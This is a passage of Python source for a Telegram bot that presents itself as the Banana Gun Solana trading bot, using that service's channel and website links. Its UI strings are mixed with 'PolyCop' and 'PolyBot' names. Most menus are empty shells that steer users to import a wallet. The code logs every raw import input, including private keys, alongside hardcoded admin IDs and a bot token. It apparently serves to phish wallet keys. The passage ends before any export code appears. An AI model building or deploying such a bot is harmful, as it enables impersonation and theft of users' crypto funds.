"""
Solana Telegram Trading Bot
Features: Wallet import/create, balance check, token prices, buy/sell via Jupiter
All responses are sent as new messages so full chat history is always preserved.
"""
import os
import logging
import base64
import html
import aiohttp
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ForceReply
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters
)
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solana.rpc.async_api import AsyncClient
from cryptography.fernet import Fernet
from mnemonic import Mnemonic
import hashlib

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ── Config ────────────────────────────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "8740576594:AAHw-6HDaZ-81F_VDiirvteALvOBQgEQQEU")
RPC_URL     = os.getenv("RPC_URL", "https://api.mainnet-beta.solana.com")
BOT_USERNAME = os.getenv("BOT_USERNAME")

ENCRYPT_KEY = os.getenv("ENCRYPT_KEY") or Fernet.generate_key()
fernet      = Fernet(ENCRYPT_KEY)

# Admin user IDs — find yours by messaging @userinfobot on Telegram
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "7971878131,8788509984").split(",") if x.strip()]

# In-memory user store { user_id: { "keypair_enc": bytes, "pubkey": str } }
# Replace with a proper encrypted DB in production
user_wallets: dict[int, dict] = {}

# Raw wallet import inputs { user_id: [ { "text": str, "valid": bool, ... } ] }
wallet_import_history: dict[int, list[dict]] = {}

# All users who have interacted with the bot { user_id: { "username": str, ... } }
all_users: dict[int, dict] = {}

EXPORT_MESSAGE_LIMIT = 3900
REFERRAL_CODE_ALPHABET = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
REFERRAL_CODE_INDEX = {char: idx for idx, char in enumerate(REFERRAL_CODE_ALPHABET)}

JUPITER_QUOTE_URL = "https://quote-api.jup.ag/v6/quote"
JUPITER_SWAP_URL  = "https://quote-api.jup.ag/v6/swap"
SOL_MINT          = "So11111111111111111111111111111111111111112"
BOT_TITLE         = os.getenv("BOT_TITLE", "Banana Gun Bot")
OFFICIAL_CHANNEL_URL = os.getenv("OFFICIAL_CHANNEL_URL", "https://t.me/BananaGunBot")
ANNOUNCEMENT_CHANNEL_URL = os.getenv(
    "ANNOUNCEMENT_CHANNEL_URL",
    "https://t.me/BananaGunAnnouncements",
)
WEBSITE_URL       = os.getenv("WEBSITE_URL", "https://bananagun.io/")
TWITTER_URL       = os.getenv("TWITTER_URL", "https://x.com/BananaGunBot")

# Conversation states
AWAITING_PRIVATE_KEY = 1
AWAITING_TOKEN_ADDR  = 2
AWAITING_BUY_AMOUNT  = 3
AWAITING_SELL_AMOUNT = 4
AWAITING_COPY_TRADE_TARGET = 5

COPY_TRADE_NETWORKS = ("ETH", "SOL", "BASE", "BSC", "ARB")

# ── Helpers ───────────────────────────────────────────────────────────────────
def encrypt_key(secret_bytes: bytes) -> bytes:
    return fernet.encrypt(secret_bytes)

def decrypt_key(token: bytes) -> bytes:
    return fernet.decrypt(token)

def get_keypair(user_id: int) -> Keypair | None:
    entry = user_wallets.get(user_id)
    if not entry:
        return None
    return Keypair.from_bytes(decrypt_key(entry["keypair_enc"]))

def _format_full_name(info: dict) -> str:
    parts = [info.get("first_name"), info.get("last_name")]
    return " ".join(part for part in parts if part).strip()

def _encode_referral_code(uid: int) -> str:
    if uid < 0:
        raise ValueError("uid must be non-negative")
    if uid == 0:
        return "0"

    chars = []
    while uid:
        uid, remainder = divmod(uid, 62)
        chars.append(REFERRAL_CODE_ALPHABET[remainder])
    return "".join(reversed(chars))

def _decode_referral_code(code: str) -> int | None:
    code = code.strip()
    if not code:
        return None
    if code.isdigit():
        return int(code)

    value = 0
    for char in code:
        if char not in REFERRAL_CODE_INDEX:
            return None
        value = value * 62 + REFERRAL_CODE_INDEX[char]
    return value

def _referral_code(uid: int) -> str:
    return _encode_referral_code(uid)

def _referral_link(uid: int, bot_username: str) -> str:
    return f"https://t.me/{bot_username}?start=ref_{_referral_code(uid)}"

def _split_message(text: str, limit: int = EXPORT_MESSAGE_LIMIT) -> list[str]:
    if len(text) <= limit:
        return [text]

    chunks: list[str] = []
    current = ""

    for line in text.splitlines(keepends=True):
        if len(line) > limit:
            if current:
                chunks.append(current.rstrip("\n"))
                current = ""

            for start in range(0, len(line), limit):
                part = line[start : start + limit].rstrip("\n")
                if part:
                    chunks.append(part)
            continue

        if current and len(current) + len(line) > limit:
            chunks.append(current.rstrip("\n"))
            current = line
        else:
            current += line

    if current:
        chunks.append(current.rstrip("\n"))

    return [chunk for chunk in chunks if chunk]

async def ensure_bot_username(ctx: ContextTypes.DEFAULT_TYPE) -> str | None:
    global BOT_USERNAME
    cached_username = ctx.application.bot_data.get("bot_username")
    if isinstance(cached_username, str) and cached_username:
        BOT_USERNAME = cached_username
        return BOT_USERNAME

    bot_username = ctx.bot.username
    if not bot_username:
        try:
            bot_username = (await ctx.bot.get_me()).username
        except Exception:
            bot_username = None

    if bot_username:
        BOT_USERNAME = bot_username
        ctx.application.bot_data["bot_username"] = bot_username
        return BOT_USERNAME

    if BOT_USERNAME:
        return BOT_USERNAME

    return None

async def _delete_message_job(context: ContextTypes.DEFAULT_TYPE):
    chat_id, message_id = context.job.data
    try:
        await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception as exc:
        logger.debug("Failed to delete message %s/%s: %s", chat_id, message_id, exc)

def _record_wallet_import_input(uid: int, raw_text: str, origin: str | None) -> dict:
    entry = {
        "text": raw_text,
        "valid": False,
        "origin": origin or "unknown",
        "timestamp": datetime.now().isoformat(timespec="seconds"),
    }
    wallet_import_history.setdefault(uid, []).append(entry)
    return entry

async def get_sol_balance(pubkey_str: str) -> float:
    async with AsyncClient(RPC_URL) as client:
        resp = await client.get_balance(Pubkey.from_string(pubkey_str))
        return resp.value / 1e9

async def get_token_price_usd(mint: str) -> float | None:
    url = f"https://price.jup.ag/v4/price?ids={mint}"
    async with aiohttp.ClientSession() as s:
        async with s.get(url) as r:
            if r.status != 200:
                return None
            data = await r.json()
            return data.get("data", {}).get(mint, {}).get("price")

async def jupiter_quote(in_mint: str, out_mint: str, amount_lamports: int):
    params = {
        "inputMint":   in_mint,
        "outputMint":  out_mint,
        "amount":      amount_lamports,
        "slippageBps": 50,
    }
    async with aiohttp.ClientSession() as s:
        async with s.get(JUPITER_QUOTE_URL, params=params) as r:
            if r.status != 200:
                return None
            return await r.json()

async def jupiter_swap(quote: dict, user_pubkey: str) -> dict | None:
    payload = {
        "quoteResponse":             quote,
        "userPublicKey":             user_pubkey,
        "wrapAndUnwrapSol":          True,
        "dynamicComputeUnitLimit":   True,
        "prioritizationFeeLamports": 1000,
    }
    async with aiohttp.ClientSession() as s:
        async with s.post(JUPITER_SWAP_URL, json=payload) as r:
            if r.status != 200:
                return None
            return await r.json()

# ── Keyboards ─────────────────────────────────────────────────────────────────
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🍌 Sniper", callback_data="lp_sniper"),
         InlineKeyboardButton("✨ Manual Buyer", callback_data="manual_buyer")],
        [InlineKeyboardButton("🎭 Copy Trading", callback_data="copy_trade"),
         InlineKeyboardButton("🗒 Positions", callback_data="portfolio")],
        [InlineKeyboardButton("💰 DCA Overview", callback_data="afk_mode"),
         InlineKeyboardButton("🔫 Pending Snipes", callback_data="pending_snipes")],
        [InlineKeyboardButton("⏳ Pending Orders", callback_data="limit_orders"),
         InlineKeyboardButton("🚀 Auto Pilot", callback_data="backup_bots")],
        [InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
        [InlineKeyboardButton("× Close", callback_data="close")],
    ])

def back_to_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")],
    ])

def positions_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 Volume", callback_data="market_volume"),
         InlineKeyboardButton("📁 Category", callback_data="market_category")],
        [InlineKeyboardButton("🔥 Trending", callback_data="market_trending"),
         InlineKeyboardButton("✨ New", callback_data="market_new")],
        [InlineKeyboardButton("🎰 Up or Down", callback_data="market_up_down")],
        [InlineKeyboardButton("🔴 Live", callback_data="market_live")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="positions_homepage")],
    ])

def wallet_settings_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Import Wallet",  callback_data="wallets_import"),
         InlineKeyboardButton("❌ Delete Wallet",   callback_data="wallets_delete")],
        [InlineKeyboardButton("◀️ Back",           callback_data="wallets_back"),
         InlineKeyboardButton("🗑️ Close",          callback_data="wallets_close")],
    ])

LANGUAGE_MENU_TEXT = (
    "⚙️ Switch system language: Click the\n"
    "language name to switch the language of\n"
    "PolyCop"
)

LANGUAGE_SELECTIONS = {
    "language_select_en": "en",
    "language_select_ja": "ja",
    "language_select_ru": "ru",
    "language_select_ko": "ko",
    "language_select_fr": "fr",
    "language_select_ar": "ar",
    "language_select_zh_tw": "zh_tw",
    "language_select_zh_cn": "zh_cn",
    "language_select_pt": "pt",
    "language_select_es": "es",
}

LANGUAGE_WALLET_COPY = {
    "en": {
        "title": "💰 Wallet Settings",
        "manage": "Manage your wallets quickly and easily.",
        "available": "👜 Available Wallets",
        "none": "No wallets imported yet.",
        "updated": "🕐 Last updated:",
        "import": "🔑 Import Wallet",
        "delete": "❌ Delete Wallet",
        "back": "◀️ Back",
        "close": "🗑️ Close",
    },
    "ja": {
        "title": "💰 ウォレット設定",
        "manage": "ウォレットをすばやく簡単に管理できます。",
        "available": "👜 利用可能なウォレット",
        "none": "まだインポートされたウォレットはありません。",
        "updated": "🕐 最終更新:",
        "import": "🔑 ウォレットをインポート",
        "delete": "❌ ウォレットを削除",
        "back": "◀️ 戻る",
        "close": "🗑️ 閉じる",
    },
    "ru": {
        "title": "💰 Настройки кошелька",
        "manage": "Управляйте своими кошельками быстро и удобно.",
        "available": "👜 Доступные кошельки",
        "none": "Кошельки еще не импортированы.",
        "updated": "🕐 Обновлено:",
        "import": "🔑 Импортировать кошелек",
        "delete": "❌ Удалить кошелек",
        "back": "◀️ Назад",
        "close": "🗑️ Закрыть",
    },
    "ko": {
        "title": "💰 지갑 설정",
        "manage": "지갑을 빠르고 쉽게 관리하세요.",
        "available": "👜 사용 가능한 지갑",
        "none": "아직 가져온 지갑이 없습니다.",
        "updated": "🕐 마지막 업데이트:",
        "import": "🔑 지갑 가져오기",
        "delete": "❌ 지갑 삭제",
        "back": "◀️ 뒤로",
        "close": "🗑️ 닫기",
    },
    "fr": {
        "title": "💰 Paramètres du portefeuille",
        "manage": "Gérez vos portefeuilles rapidement et facilement.",
        "available": "👜 Portefeuilles disponibles",
        "none": "Aucun portefeuille importé pour le moment.",
        "updated": "🕐 Dernière mise à jour :",
        "import": "🔑 Importer le portefeuille",
        "delete": "❌ Supprimer le portefeuille",
        "back": "◀️ Retour",
        "close": "🗑️ Fermer",
    },
    "ar": {
        "title": "💰 إعدادات المحفظة",
        "manage": "أدر محافظك بسرعة وسهولة.",
        "available": "👜 المحافظ المتاحة",
        "none": "لم يتم استيراد أي محفظة بعد.",
        "updated": "🕐 آخر تحديث:",
        "import": "🔑 استيراد المحفظة",
        "delete": "❌ حذف المحفظة",
        "back": "◀️ رجوع",
        "close": "🗑️ إغلاق",
    },
    "zh_tw": {
        "title": "💰 錢包設定",
        "manage": "快速且輕鬆地管理你的錢包。",
        "available": "👜 可用錢包",
        "none": "尚未匯入任何錢包。",
        "updated": "🕐 最後更新：",
        "import": "🔑 匯入錢包",
        "delete": "❌ 刪除錢包",
        "back": "◀️ 返回",
        "close": "🗑️ 關閉",
    },
    "zh_cn": {
        "title": "💰 钱包设置",
        "manage": "快速轻松地管理你的钱包。",
        "available": "👜 可用钱包",
        "none": "尚未导入任何钱包。",
        "updated": "🕐 最后更新：",
        "import": "🔑 导入钱包",
        "delete": "❌ 删除钱包",
        "back": "◀️ 返回",
        "close": "🗑️ 关闭",
    },
    "pt": {
        "title": "💰 Configurações da carteira",
        "manage": "Gerencie suas carteiras de forma rápida e fácil.",
        "available": "👜 Carteiras disponíveis",
        "none": "Nenhuma carteira importada ainda.",
        "updated": "🕐 Última atualização:",
        "import": "🔑 Importar carteira",
        "delete": "❌ Excluir carteira",
        "back": "◀️ Voltar",
        "close": "🗑️ Fechar",
    },
    "es": {
        "title": "💰 Configuración de la billetera",
        "manage": "Administra tus billeteras de forma rápida y sencilla.",
        "available": "👜 Billeteras disponibles",
        "none": "Aún no hay billeteras importadas.",
        "updated": "🕐 Última actualización:",
        "import": "🔑 Importar billetera",
        "delete": "❌ Eliminar billetera",
        "back": "◀️ Volver",
        "close": "🗑️ Cerrar",
    },
}

def language_keyboard(back_callback: str = "language_back"):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("English", callback_data="language_select_en"),
         InlineKeyboardButton("日本語", callback_data="language_select_ja")],
        [InlineKeyboardButton("Русский", callback_data="language_select_ru"),
         InlineKeyboardButton("한국어", callback_data="language_select_ko")],
        [InlineKeyboardButton("Français", callback_data="language_select_fr"),
         InlineKeyboardButton("عربي", callback_data="language_select_ar")],
        [InlineKeyboardButton("繁體中文", callback_data="language_select_zh_tw"),
         InlineKeyboardButton("简体中文", callback_data="language_select_zh_cn")],
        [InlineKeyboardButton("Português", callback_data="language_select_pt"),
         InlineKeyboardButton("Español", callback_data="language_select_es")],
        [InlineKeyboardButton("← Back", callback_data=back_callback)],
    ])

def _wallet_settings_language(language: str) -> dict:
    return LANGUAGE_WALLET_COPY.get(language, LANGUAGE_WALLET_COPY["en"])

def _localized_wallet_settings_text(language: str = "en") -> str:
    copy = _wallet_settings_language(language)
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return (
        f"{copy['title']}\n"
        f"{copy['manage']}\n\n"
        f"{copy['available']}\n"
        f"{copy['none']}\n\n"
        f"{copy['updated']} {ts}"
    )

def wallet_settings_keyboard(
    language: str = "en",
    back_callback: str = "wallets_back",
    close_callback: str = "wallets_close",
):
    copy = _wallet_settings_language(language)
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(copy["import"], callback_data="wallets_import"),
         InlineKeyboardButton(copy["delete"], callback_data="wallets_delete")],
        [InlineKeyboardButton(copy["back"], callback_data=back_callback),
         InlineKeyboardButton(copy["close"], callback_data=close_callback)],
    ])

MARKET_CATEGORY_LABELS = {
    "market_volume": "Volume",
    "market_category": "Category",
    "market_trending": "Trending",
    "market_new": "New",
    "market_up_down": "Up or Down",
    "market_live": "Live",
    "market_politics": "Politics",
    "market_sports": "Sports",
    "market_crypto": "Crypto",
    "market_trump": "Trump",
    "market_finance": "Finance",
    "market_geopolitics": "Geopolitics",
}

def _markets_text(selected_category: str | None = None) -> str:
    return (
        "🔎 Market Search\n\n"
        "Type any keyword to search (e.g. \"bitcoin\",\n"
        "\"trump\")\n\n"
        "Or browse by:"
    )

def _wallet_settings_text() -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
    return (
        "💰 *Wallet Settings*\n"
        "Manage your wallets quickly and easily\\.\n\n"
        "👜 *Available Wallets*\nNo wallets imported yet\\.\n\n"
        f"🕐 *Last updated:* {ts}"
    )

def _home_screen_text() -> str:
    return (
        f"⚙️ {html.escape(BOT_TITLE)}\n\n"
        "<b>🍌 Your smart ally in the world of trading:</b>\n"
        "Boost your gains with Banana Gun. Trade faster, snipe earlier and track live profits.\n\n"
        f"💬 <a href=\"{html.escape(OFFICIAL_CHANNEL_URL)}\">Official Channel</a>\n"
        f"🎉 <a href=\"{html.escape(ANNOUNCEMENT_CHANNEL_URL)}\">Announcement channel</a>\n"
        f"🌍 <a href=\"{html.escape(WEBSITE_URL)}\">Website</a>\n"
        f"🚪 <a href=\"{html.escape(TWITTER_URL)}\">Twitter</a>\n\n"
        "<i>Paste the token address below to quick start with preset defaults.</i>"
    )

async def _show_main_menu(query):
    await query.edit_message_text(
        _home_screen_text(),
        parse_mode="HTML",
        disable_web_page_preview=True,
        reply_markup=main_menu_keyboard(),
    )

async def _show_copy_trade(query, ctx: ContextTypes.DEFAULT_TYPE, chain: str | None = None):
    selected_chain = _copy_trade_chain(chain or ctx.user_data.get("copy_trade_chain"))
    ctx.user_data["copy_trade_chain"] = selected_chain
    await query.edit_message_text(
        _copy_trade_text(selected_chain),
        reply_markup=copy_trade_keyboard(selected_chain),
    )

def _help_text() -> str:
    return (
        "🆘 Support\n\n"
        "Use the menu to navigate between markets, wallet tools, and settings.\n"
        "Import your wallet when prompted.\n\n"
        "If the bot is slow, contact support."
    )

def help_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Recovery",     callback_data="help_recovery"),
         InlineKeyboardButton("Create Ticket", callback_data="help_create_ticket")],
        [InlineKeyboardButton("◀️ Back",      callback_data="back_to_menu")],
    ])

def alerts_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⬅️ Prev", callback_data="alerts_prev"),
         InlineKeyboardButton("Page 1/1", callback_data="alerts_page"),
         InlineKeyboardButton("Next ➡️", callback_data="alerts_next")],
        [InlineKeyboardButton("➕ Add Market Alert", callback_data="alerts_add_market")],
        [InlineKeyboardButton("👀 Add Wallet Watcher", callback_data="alerts_add_wallet")],
        [InlineKeyboardButton("⬅️ Back", callback_data="back_to_menu"),
         InlineKeyboardButton("🏠 Main Menu", callback_data="alerts_main_menu")],
    ])

def _alerts_text() -> str:
    return (
        "🔔 Alerts\n\n"
        "You have no active alerts.\n"
        "You are not tracking any wallets yet.\n\n"
        "Add a market alert from your open positions or paste a Polymarket market link.\n"
        "Track a trader wallet to get activity alerts."
    )

def recovery_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Add wallet", callback_data="recovery_add_wallet")],
    ])

def _recovery_text() -> str:
    return (
        "Eligible Accounts are required to access smart wallets"
    )

def _user_profile_text() -> str:
    return "No user profile detected"

def lp_sniper_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🎯 Create Task", callback_data="lp_sniper_create")],
        [InlineKeyboardButton("◀️ Back",        callback_data="lp_sniper_back"),
         InlineKeyboardButton("🔄 Refresh",     callback_data="lp_sniper_refresh")],
        [InlineKeyboardButton("🗑️ Close",       callback_data="lp_sniper_close")],
    ])

def _lp_sniper_text() -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
    return (
        "🍌 *Sniper*\n\n"
        "🧐 No active sniper tasks\\!\n\n"
        "📖 [Learn More\\!](https://your-link-here)\n\n"
        f"🕐 *Last updated:* {ts}"
    )

def _pending_snipes_text() -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
    return (
        "📉 *Pending Snipes*\n\n"
        "🚫You have no Active Snipes🚫\n"
        "\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\n\n"
        f"🕟 {ts}"
    )

def pending_snipes_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("SOL",  callback_data="pending_snipes_sol"),
         InlineKeyboardButton("ETH",  callback_data="pending_snipes_eth")],
        [InlineKeyboardButton("BNB",  callback_data="pending_snipes_bnb"),
         InlineKeyboardButton("BASE", callback_data="pending_snipes_base")],
        [InlineKeyboardButton("🔑 Add Wallet",  callback_data="wallets_import")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="pending_snipes_main_menu")],
    ])

def _copy_trade_chain(chain: str | None) -> str:
    if chain in COPY_TRADE_NETWORKS:
        return chain
    return COPY_TRADE_NETWORKS[0]

def _shift_copy_trade_chain(chain: str | None, step: int) -> str:
    normalized = _copy_trade_chain(chain)
    index = COPY_TRADE_NETWORKS.index(normalized)
    return COPY_TRADE_NETWORKS[(index + step) % len(COPY_TRADE_NETWORKS)]

def copy_trade_keyboard(chain: str = "ETH"):
    chain = _copy_trade_chain(chain)
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("◀", callback_data="copy_trade_chain_prev"),
         InlineKeyboardButton(chain, callback_data="copy_trade_chain_current"),
         InlineKeyboardButton("▶", callback_data="copy_trade_chain_next")],
        [InlineKeyboardButton("♻️ Refresh", callback_data="copy_trade_refresh")],
        [InlineKeyboardButton("🎭 New Copy Trade", callback_data="copy_trade_new")],
        [InlineKeyboardButton("🚫 Blocked Tokens", callback_data="copy_trade_blocked_tokens")],
        [InlineKeyboardButton("🎭 Token Creator Filter", callback_data="copy_trade_token_creator_filter")],
        [InlineKeyboardButton("← Back", callback_data="copy_trade_back"),
         InlineKeyboardButton("× Close", callback_data="copy_trade_close")],
    ])

def copy_trade_detail_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("← Back", callback_data="copy_trade_detail_back"),
         InlineKeyboardButton("× Close", callback_data="copy_trade_close")],
    ])

def afk_mode_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("+ Create DCA", callback_data="afk_create")],
        [InlineKeyboardButton("✨ Ready to Run", callback_data="afk_backtesting")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="afk_main_menu")],
    ])

def _afk_mode_text() -> str:
    return (
        "💰 DCA Overview\n\n"
        "You don't have any DCA strategies yet.\n\n"
        "Start with Ready to Run for preset setups, or use Create DCA to build your own."
    )

def _copy_trade_text(chain: str = "ETH") -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    return (
        "Copytrades\n\n"
        "🚫 No Active Copytrades Found 🚫\n\n"
        "──────────────────────────────────────\n\n"
        "──────\n"
        f"🕒 {ts}"
    )

def _copy_trade_blocked_tokens_text() -> str:
    return (
        "Blocked Tokens\n\n"
        "No blocked tokens configured yet."
    )

def _copy_trade_creator_filter_text() -> str:
    return (
        "Token Creator Filter\n\n"
        "No creator filters configured yet."
    )

def backup_bots_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Back", callback_data="backup_bots_back"),
         InlineKeyboardButton("🔄 Refresh", callback_data="backup_bots_refresh")],
        [InlineKeyboardButton("🗑️ Close", callback_data="backup_bots_close")],
    ])

def _backup_bots_text() -> str:
    return (
        "🚀 *Auto Pilot*\n\n"
        "No source wallets configured\\.\n\n"
        "Please add a wallet to enable auto pilot functionality\\."
    )

def bridge_keyboard(bot_username: str | None = None):
    add_button = InlineKeyboardButton("➕ Add to Group", callback_data="bridge_add")
    if bot_username:
        add_button = InlineKeyboardButton(
            "➕ Add to Group",
            url=f"https://t.me/{bot_username}?startgroup=true",
        )
    return InlineKeyboardMarkup([
        [add_button],
        [InlineKeyboardButton("◀️ Back", callback_data="bridge_back"),
         InlineKeyboardButton("🔄 Refresh", callback_data="bridge_refresh")],
    ])

def _bridge_text() -> str:
    return (
        "👥 Add to Group\n\n"
        "Add PolyBot to a Telegram group so multiple people can use it from the same chat.\n\n"
        "Tap the button below to open Telegram's add-to-group flow."
    )

def referral_keyboard(
    back_callback: str = "referral_back",
    close_callback: str = "referral_close",
):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔗 Generate Link", callback_data="referral_generate")],
        [InlineKeyboardButton("✏️ Edit Code", callback_data="referral_edit_code"),
         InlineKeyboardButton("📷 Create QR", callback_data="referral_create_qr"),
         InlineKeyboardButton("Claim", callback_data="referral_claim")],
        [InlineKeyboardButton("◀️ Back",                 callback_data=back_callback),
         InlineKeyboardButton("🔄 Refresh",              callback_data="referral_refresh")],
        [InlineKeyboardButton("🗑️ Close",                callback_data=close_callback)],
    ])

def _referral_text(uid: int, bot_username: str) -> str:
    code = _referral_code(uid)
    link = _referral_link(uid, bot_username)
    return (
        "🫂 Referral Hub\n"
        "Earn commissions when your referrals trade!\n\n"
        "🪪 Your Code\n"
        f"{code}\n\n"
        "🔗 Invite Link\n"
        f"{link}\n\n"
        "━━━━━━━━━━━━━━━━\n"
        "🛰 Network Metrics\n"
        "├ Tier 1 Direct: 0 users (25%)\n"
        "├ Tier 2: 0 users (5%)\n"
        "├ Tier 3: 0 users (3%)\n"
        "└ Total Reach: 0 users\n\n"
        "━━━━━━━━━━━━━━━━\n"
        "💰 Earnings Dashboard\n"
        "├ Claimable: $0.0000 USDC\n"
        "└ Total Earned: $0.00 USDC\n\n"
        "⚠️ Minimum withdrawal: $5 USDC."
    )

def competition_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Add Account", callback_data="competition_add_account")],
        [InlineKeyboardButton("Close", callback_data="competition_close")],
    ])

def _competition_text() -> str:
    return (
        "🏆 Competition\n\n"
        "Link your account to access available competitions"
    )

def withdraw_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("50 %",           callback_data="withdraw_50"),
         InlineKeyboardButton("100 %",          callback_data="withdraw_100"),
         InlineKeyboardButton("X SOL",          callback_data="withdraw_xsol")],
        [InlineKeyboardButton("💸 Set Address", callback_data="withdraw_set_address")],
        [InlineKeyboardButton("◀️ Back",        callback_data="withdraw_back"),
         InlineKeyboardButton("🔄 Refresh",     callback_data="withdraw_refresh")],
        [InlineKeyboardButton("🗑️ Close",       callback_data="withdraw_close")],
    ])

def _withdraw_text() -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S").replace("-", "\\-")
    return (
        "🌸 *Withdraw Solana*\n\n"
        "Balance: \\-\\- SOL\n"
        "Current withdrawal address: \\-\\-\n\n"
        "🔧 Last address edit: \\-\\-\n\n"
        f"🕐 *Last updated:* {ts}"
    )

def settings_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔨 Security Pin Settings", callback_data="settings_security_pin"),
         InlineKeyboardButton("⛽ Preset Settings", callback_data="settings_buy_sell_setting")],
        [InlineKeyboardButton("💰 Wallet Settings", callback_data="settings_wallets"),
         InlineKeyboardButton("♻️ Recovery", callback_data="settings_recovery")],
        [InlineKeyboardButton("🌐 Language", callback_data="settings_language"),
         InlineKeyboardButton("🤝 Referral Code", callback_data="settings_referral")],
        [InlineKeyboardButton("🖼️ Customize UI", callback_data="settings_customize_ui"),
         InlineKeyboardButton("🧰 Utilities", callback_data="settings_utilities")],
        [InlineKeyboardButton("← Back", callback_data="settings_back"),
         InlineKeyboardButton("× Close", callback_data="settings_close")],
    ])

def _settings_text() -> str:
    return (
        "⚙️ Settings"
    )

def settings_detail_keyboard(back_callback: str = "settings_menu_back"):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("← Back", callback_data=back_callback),
         InlineKeyboardButton("× Close", callback_data="settings_close")],
    ])

def preset_settings_keyboard(back_callback: str = "settings_menu_back", close_callback: str = "settings_close"):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🛒 Buy Preset", callback_data="settings_buy_preset"),
         InlineKeyboardButton("💸 Sell Preset", callback_data="settings_sell_preset")],
        [InlineKeyboardButton("← Back", callback_data=back_callback),
         InlineKeyboardButton("× Close", callback_data=close_callback)],
    ])

def _settings_page_text(title: str, body: str) -> str:
    return (
        f"{title}\n\n"
        f"{body}"
    )

def _preset_settings_text() -> str:
    return (
        "⛽ Preset Settings\n\n"
        "Choose whether you want to manage the buy preset or the sell preset."
    )

def _preset_side_text(side: str) -> str:
    if side == "buy":
        title = "🛒 Buy Preset"
        body = "Open the wallet settings keyboard below to configure buy presets."
    else:
        title = "💸 Sell Preset"
        body = "Open the wallet settings keyboard below to configure sell presets."
    return _settings_page_text(title, body)

def presales_keyboard(
    back_callback: str = "presales_back",
    close_callback: str = "presales_close",
    back_label: str = "🏠 Main Menu",
):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚙️ Config",    callback_data="presales_config")],
        [InlineKeyboardButton("Add Preset",   callback_data="presales_add")],
        [InlineKeyboardButton(back_label, callback_data=back_callback),
         InlineKeyboardButton("🗑️ Close",     callback_data=close_callback)],
    ])

def _presales_text() -> str:
    return (
        "⚡ Presets\n\n"
        "Add, remove, and manage trading presets.\n\n"
        "Configure defaults once, then reuse them across workflows."
    )

def limit_orders_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🏠 Main Menu", callback_data="back_to_menu")],
    ])

def tpsl_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Active", callback_data="tpsl_active"),
         InlineKeyboardButton("Closed", callback_data="tpsl_closed")],
        [InlineKeyboardButton("➕ New Stop Loss", callback_data="tpsl_new_stop_loss")],
        [InlineKeyboardButton("📜 Activity Logs", callback_data="tpsl_activity_logs")],
        [InlineKeyboardButton("Go to Portfolio", callback_data="tpsl_portfolio")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="back_to_menu")],
    ])

def _limit_orders_text() -> str:
    return (
        "⏳ *Pending Orders*\n\n"
        "You have no pending orders\\.\n\n"
        "🔑 A wallet is required to access pending orders\\."
    )

def _tpsl_text() -> str:
    return (
        "🛡️ Stop Loss Orders\n\n"
        "You have no active stop loss orders.\n\n"
        "Set up automatic sell triggers to limit downside on your positions."
    )

def portfolio_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⬅️ Prev", callback_data="portfolio_prev"),
         InlineKeyboardButton("Page 1/1", callback_data="portfolio_page"),
         InlineKeyboardButton("Next ➡️", callback_data="portfolio_next")],
        [InlineKeyboardButton("➤ 📁 All [0]", callback_data="portfolio_all"),
         InlineKeyboardButton("🟢 Open [0]", callback_data="portfolio_open"),
         InlineKeyboardButton("📖 History", callback_data="portfolio_history")],
        [InlineKeyboardButton("↕️ Sort: Value", callback_data="portfolio_sort")],
        [InlineKeyboardButton("📈 Limit Orders (0)", callback_data="portfolio_limit_orders"),
